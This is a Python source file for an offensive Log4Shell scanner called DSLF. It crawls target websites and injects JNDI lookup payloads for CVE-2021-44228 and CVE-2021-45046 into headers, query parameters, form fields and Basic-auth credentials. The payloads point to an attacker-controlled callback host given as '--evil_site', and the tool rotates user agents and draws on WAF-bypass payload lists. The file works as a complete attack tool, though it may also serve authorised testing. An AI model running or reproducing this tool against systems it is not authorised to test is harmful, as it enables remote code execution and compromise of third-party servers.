#!/usr/bin/env python3
import argparse, base64, random, requests, string, sys, time, urllib3
from bs4 import BeautifulSoup
from datetime import datetime
from termcolor import cprint
from urllib.parse import urljoin

TIMEOUT = 3
WAIT_MIN = 500000
WAIT_RAND_MAX = 600000
HEADER_UA = {'1': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36', 
             '2': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
             '3': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
             '4': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
             '5': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
             '6': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
             '7': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 OPR/81.0.4196.61',
             '8': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.72',
             '9': 'Mozilla/5.0 (Linux; Android 10; Android SDK built for x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
             '10': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36',
             '11': 'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36',
             '12': 'Mozilla/5.0 (Android 9; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0',
             '13': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
             '14': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1',
             '15': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15',
             '16': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17'}
HEADER_CLASSIC = {'Accept': '*/*',
                  'Accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
                  'Cache-control': 'max-age=0',
                  'Referer': 'https://{{PAYLOAD}}',
                  'User-agent': '{{PAYLOAD}}'}
PAYLOAD_CLASSIC = ['${jndi:ldap://{{EVIL}}:{{PORT}}/a}', '${jndi:ldap://127.0.0.1#{{EVIL}}:{{PORT}}/a}']
PAYLOAD_FILES = {'ldap': 'waf_bypass_ldap.txt', 'http': 'waf_bypass_http.txt', 'dns': 'waf_bypass_dns.txt'}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

###
def crawler_add2queue(path, url, queue):
  if path.startswith(url) and path not in queue:
    queue.append(path)
    #cprint(f'[!]   -> {path}', 'cyan') 


###
def crawler_get_url(url, html, queue):
  soup = BeautifulSoup(html, 'html.parser')
  for link in soup.find_all('a'):
    path = link.get('href')
    if path is not None:
      if path and path.startswith('/'):
        path = urljoin(url, path)
      crawler_add2queue(path, url, queue)


###
def get_payloads(_payload, _evil_site, _evil_port, _callback):
  payloads = []

  if _payload == 'classic':
    for p in PAYLOAD_CLASSIC:
      payload = p.replace('{{EVIL}}', _evil_site)
      payload = payload.replace('{{PORT}}', _evil_port)
      payloads.append(payload)

  elif _payload == 'random':
    tmp_payloads = []
    with open(PAYLOAD_FILES[_callback], 'r') as fp:
      for line in fp.readlines():
        line = line.strip()
        line = line.replace('{{EVIL}}', _evil_site)
        line = line.replace('{{PORT}}', _evil_port)
        tmp_payloads.append(line)
    for i in range(0, 10):
      chaos = random.randint(1, len(tmp_payloads))
      payloads.append(tmp_payloads[chaos])

  elif _payload == 'extended':
    with open(PAYLOAD_FILES[_callback], 'r') as fp:
      for line in fp.readlines():
        line = line.strip()
        line = line.replace('{{EVIL}}', _evil_site)
        line = line.replace('{{PORT}}', _evil_port)
        payloads.append(line)

  return payloads


###
def get_headers(header, payload):
  headers = {}

  if header == 'none':
    chaos = str(random.randint(1, len(HEADER_UA)))
    headers.update({'User-agent': HEADER_UA[chaos]})
  else:
    for h in HEADER_CLASSIC:
      if 'User-agent' in h and header == 'noua':
        chaos = str(random.randint(1, len(HEADER_UA)))
        headers.update({'User-agent': HEADER_UA[chaos]})
      else:
        value = HEADER_CLASSIC[h]
        value = value.replace('{{PAYLOAD}}', payload)
        headers.update({h: value})
  return headers


### 
def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload):
  payloads = get_payloads(_payload, _evil_site, _evil_port, _callback)
  max_payloads = len(payloads)
  cpt_payloads = 1

  try:
    chaos = str(random.randint(1, len(HEADER_UA)))
    response = requests.get(_url, headers={'User-agent': HEADER_UA[chaos]}, verify=False)
    soup = BeautifulSoup(response.content, 'html.parser')
  except:
    cprint('[!] FATAL: the given URL is not reachable', 'red', attrs=['bold'])
    return 

  cprint(f'[!]   -> HTTP Code {response.status_code}', 'cyan')

  for payload in payloads:
    now = datetime.now()
    now = now.strftime("%d/%m/%Y %H:%M:%S")
    cprint(f'[!]   -> Current payload {cpt_payloads}/{max_payloads} ({now}): {payload}', 'cyan')

    # _method = get
    if _method == 'get' or _method == 'both':
      headers = get_headers(_header, payload)
      if _param == 'none':
        requests.request(url=_url, method='GET', headers=headers, verify=False, timeout=TIMEOUT)
      elif _param == 'classic':
        requests.request(url=_url, method='GET', params={"q": payload}, headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
      time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)

    # _method = post
    if _method == 'post' or _method == 'both':
      headers = get_headers(_header, payload)
   
      if response.status_code == 401:
        creds = payload + ':' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        creds = 'username:password'
        creds = creds.encode('ascii')
        creds64_b = base64.b64encode(creds)
        creds64_m = creds64_b.decode('ascii')
        headers.update({'Authorization': 'Basic ' + creds64_m})
        requests.request(url=_url, method='GET', headers=headers, verify=False, timeout=TIMEOUT)
        cpt_payloads = cpt_payloads + 1
        continue 

      try:
        soup_inputs = soup.find_all('input')
        soup_action = soup.form['action']
        url = _url + soup_action
      except:
        cprint('[!]      Can\'t use POST method: did not find any form to post', 'magenta')
        continue

      inputs = []
      inputs2 = []
      for val in soup_inputs:
        inputs.append(val.get('name'))
      inputs2 = inputs

      data = {}
      for val in inputs:
        data.update({val: payload})
 
      try:
        if _param == 'none':
          requests.request(url=url, method='POST', headers=headers, data=data, verify=False, timeout=TIMEOUT)
        elif _param == 'classic':
          requests.request(url=url, method='POST', params={'q': payload}, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
        time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
      except Exception as e:
        cprint('[!] Potential vulnerability found: true positive or network blocking (check out in Active/Passive Callback Modules logs)', 'red', attrs=['bold'])
      
      # _data = full
      if _data == 'full':
        for val in inputs:
          headers = get_headers(_header, payload)
          data = {}
          data.update({val: payload})
          for val2 in inputs2:
            if val != val2:
              chaos = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
              data.update({val2: chaos})
          try:
            if _param == 'none':
              requests.request(url=url, method='POST', headers=headers, data=data, verify=False, timeout=TIMEOUT)
            elif _param == 'classic':
              requests.request(url=url, method='POST', params={'r': payload}, headers=headers, data=data, verify=False, allow_redirects=True, timeout=TIMEOUT)
            time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
          except Exception as e:
            cprint('[!] Potential vulnerability found: true positive or network blocking (check out in Active/Passive Callback Modules logs)', 'red', attrs=['bold'])
    cpt_payloads = cpt_payloads + 1

### 
def main():
  if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)
  
  parser = argparse.ArgumentParser()
  parser.add_argument('--url', action='store', dest='url', required=True, help='URL or file with URL to scan')
  parser.add_argument('--evil_site', action='store', dest='evilsite', required=True, help='IP or FQDN for the callback')
  parser.add_argument('--evil_port', action='store', dest='evilport', required=True, help='TCP port for the callback')
  parser.add_argument('--callback', action='store', default='ldap', dest='callback', help='ldap, http or dns')
  parser.add_argument('--crawl', action='store', default='no', dest='crawl', help='no or yes')
  parser.add_argument('--method', action='store', default='get', dest='method', help='get, post or both')
  parser.add_argument('--param', action='store', default='classic', dest='param', help='none or classic')
  parser.add_argument('--header', action='store', default='classic', dest='header', help='none, classic or noua')
  parser.add_argument('--data', action='store', default='classic', dest='data', help='classic or full')
  parser.add_argument('--payload', action='store', default='classic', dest='payload', help='classic, random or extended')
  args = parser.parse_args()

  try:
    url_tmp = args.url
    _url = []
    if '://' in url_tmp:
      _url.append(url_tmp)
    else:
      with open(url_tmp, 'r') as fp:
        for line in fp.readlines():
          line = line.strip()
          _url.append(line)

    _evil_site = args.evilsite
    _evil_port = args.evilport
    _callback = args.callback
    _crawl = args.crawl
    _method = args.method
    _param = args.param
    _header = args.header
    _data = args.data
    _payload = args.payload

    print('')
    cprint('[•] DSLF - (D)arth (S)ide of the (L)og4j (F)orce', 'green', attrs=['bold'])
    cprint('[•] Author: Julien GARAVET', 'green')
    cprint('[•] + Passive Callback  Module aka `PCM`', 'green')
    cprint('[•] + Active  Callback  Module aka `ACM`', 'green')
    cprint('[•] + Active  Scanner   Module aka `ASM`', 'green')
    cprint('[•] + Payload Generator Module aka `PGM`', 'green')
    tmp = """　　　　　　　　　　　　　　　┌―――┐
　　　　　　　　　　　　_,―￣||￣￣￣￣￣ ||￣ー､______
　　　　　　　　　　　「| ''　[] '|　''　　''　| ' □''|
　　　　_ｨ´ニ￣T＿|_|　　　　|　:　　:三|　:　　:　:  |
　,_＿{= (　 )ﾐ□†||||]| ,,　 ｪｪ|　:　　:￣|　,,　 :,, |
　 '￣ー二*―-￣｀┴┬┬┼―┬―┬―┬―┬―┬―┬―┬―┬―┬―┬┰┰―┬―┬―┬―┬―┬┬┘
　　　　　　　　　　　　 .(◎/_ｊ｀┸┸        ´ｔ_＿{◎}　　　　　　　　　
　　　　　　　　　　　　/　/￣　　　　　     匸| |　|　　　　　　　
　　　　　　　　　　　 /　/|　　　　　　　  |　|　|　|
　　　　　　　　　　　 ◎ ( ◎＼　　　　　     ◎　    ◎
　　　　　　　　　　　|　|　＼＼　　　　 　 |　|　 |　|
                      |　|  |　|            |  |   |　| 
　　　  　　　　　　　<00>　<00>　　        <00>   <00>"""
    cprint(tmp, 'green')
    print('')
    cprint('[*] ASM - Active Scanner Module - Intels', 'green', attrs=['bold'])
    cprint('[*] CVE-2021-44228 with payload similar to ${jndi:ldap://' + _evil_site + ':' + _evil_port + '/a}', 'green')
    cprint('[*] CVE-2021-45046 with payload similar to ${jndi:ldap://127.0.0.1#' + _evil_site + ':' + _evil_port + '/a}', 'green')
    time.sleep(1)
    print('')
    cprint('[+] ASM - Active Scanner Module - Settings', 'yellow', attrs=['bold'])
    cprint(f'[+] Url         {url_tmp}', 'yellow')
    cprint(f'[+] Evil_site   {_evil_site}', 'yellow')
    cprint(f'[+] Evil_port   {_evil_port}', 'yellow')
    cprint(f'[+] Callback    {_callback}', 'yellow')
    cprint(f'[+] Crawler     {_crawl}', 'yellow')
    cprint(f'[+] Method      {_method}', 'yellow')
    cprint(f'[+] Param       {_param}', 'yellow')
    cprint(f'[+] Header      {_header}', 'yellow')
    cprint(f'[+] Data        {_data}', 'yellow')
    cprint(f'[+] Payload     {_payload}', 'yellow')
    time.sleep(1)
    print('')
    cprint('[!] ASM - Active Scanner Module - Starting', 'cyan', attrs=['bold'])
    time.sleep(1)

    for main_url in _url:
      if _crawl == 'yes':
        cprint('[!] -------------------------------------', 'cyan')
        cprint(f'[!] Processing {main_url}', 'cyan', attrs=['bold'])

        queue = []
        queue.append(main_url)

        for u in queue:
          try:
            html = requests.get(u, verify=False).text
          except:
            cprint('[!] FATAL: the given URL is not reachable', 'red', attrs=['bold'])
            continue
          cprint('[!] Crawling ' + u, 'cyan')
          crawler_get_url(u, html, queue)
          cprint(f'[!] Scanning {u}', 'cyan')
          scanner(u, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload)
      else:
        cprint('[!] -------------------------------------', 'cyan')
        cprint(f'[!] Processing {main_url}', 'cyan', attrs=['bold'])
        cprint(f'[!] Not Crawling {main_url}', 'cyan')
        cprint(f'[!] Scanning {main_url}', 'cyan')
        scanner(main_url, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload)

  except KeyboardInterrupt:
    cprint("user interuption", 'red')
    raise SystemExit(0)


if __name__ == "__main__":
  main()
